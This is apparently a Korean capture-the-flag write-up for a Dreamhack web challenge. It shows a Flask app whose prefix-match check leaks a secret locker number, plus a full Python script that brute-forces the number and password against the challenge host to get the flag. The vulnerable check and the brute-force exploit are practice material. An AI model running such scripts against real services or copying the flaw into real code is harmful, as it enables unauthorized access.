app.py
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
import string
import random

app = Flask(__name__)

try:
    FLAG = open("./flag.txt", "r").read()       # flag is here!
except:
    FLAG = "[**FLAG**]"

# 사물함 번호는 알파벳 소문자 혹은 숫자를 포함하는 4자리 랜덤 문자열
# 비밀번호는 100 이상 200 이하의 랜덤 정수
rand_str = ""
alphanumeric = string.ascii_lowercase + string.digits
for i in range(4):
    rand_str += str(random.choice(alphanumeric))

rand_num = random.randint(100, 200)


@app.route("/", methods = ["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    else:
        locker_num = request.form.get("locker_num", "")
        password = request.form.get("password", "")

        if locker_num != "" and rand_str[0:len(locker_num)] == locker_num: # locker_num이 ab, rand_str이 abcd인 경우에도 통과됨
            if locker_num == rand_str and password == str(rand_num):
                return render_template("index.html", result = "FLAG:" + FLAG)
            return render_template("index.html", result = "Good")
        else: 
            return render_template("index.html", result = "Wrong!")
            
            
app.run(host="0.0.0.0", port=8000)
```

if locker_num != "" and rand_str[0:len(locker_num)] == locker_num 부분을 이용하면,  
한 글자씩 브루트포스를 해볼 수 있다.  

<br>

아래 코드로 플래그를 구할 수 있다.  

```python
import requests
import string
import re


def extract_result(html_response):
    """
    HTML 응답에서 result 부분 추출
    """
    result_pattern = re.compile(r'<pre>(.*?)</pre>', re.DOTALL)
    match = result_pattern.search(html_response)
    if match:
        return match.group(1)
    return None


def find_locker_num(url):
    """
    한 글자씩 시도하며 locker_num 찾기
    """
    characters = string.ascii_lowercase + string.digits
    found_prefix = ""

    # 4자리 문자열이므로 4번 반복
    for _ in range(4):
        for char in characters:
            test_prefix = found_prefix + char
            payload = {
                'locker_num': test_prefix,
                'password': '100'  # 아무 값이나 입력 (이 단계에서는 중요하지 않음)
            }

            response = requests.post(url, data=payload)
            result = extract_result(response.text)

            if result == "Good":
                found_prefix = test_prefix
                print(f"발견된 접두사: {found_prefix}")
                break

    return found_prefix


def find_password(url, locker_num):
    """
    100부터 200까지 시도하며 비밀번호 찾기
    """
    for password in range(100, 201):
        payload = {
            'locker_num': locker_num,
            'password': str(password)
        }

        response = requests.post(url, data=payload)
        result = extract_result(response.text)

        # Good이나 Wrong!이 아니면 FLAG일 가능성이 있음
        if result != "Good" and result != "Wrong!":
            return password, result

    return None, "비밀번호를 찾지 못했습니다."


def main():
    url = "http://host3.dreamhack.games:14979/"

    print("locker_num 찾는 중...")
    locker_num = find_locker_num(url)
    print(f"찾은 locker_num: {locker_num}")

    if len(locker_num) == 4:  # 완전한 4자리 locker_num을 찾았는지 확인
        print("비밀번호 찾는 중...")
        password, result = find_password(url, locker_num)

        if password:
            print(f"찾은 password: {password}")
            print(f"결과: {result}")
        else:
            print("비밀번호를 찾지 못했습니다.")
    else:
        print("locker_num을 완전히 찾지 못했습니다.")


if __name__ == "__main__":
    main()
```
